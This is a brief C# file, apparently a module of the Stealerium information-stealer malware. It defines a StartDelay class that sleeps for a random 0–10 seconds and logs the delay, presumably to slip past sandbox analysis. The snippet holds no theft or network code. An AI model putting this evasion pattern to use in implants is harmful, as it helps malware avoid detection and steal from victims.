using System;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant
{
    internal sealed class StartDelay
    {
        // Sleep min, sleep max
        private const int SleepMin = 0;
        private const int SleepMax = 10;

        // Sleep
        public static void Run()
        {
            var sleepTime = new Random().Next(
                SleepMin * 1000,
                SleepMax * 1000
            );
            Logging.Log("StartDelay : Sleeping " + sleepTime);
            Thread.Sleep(sleepTime);
        }
    }
}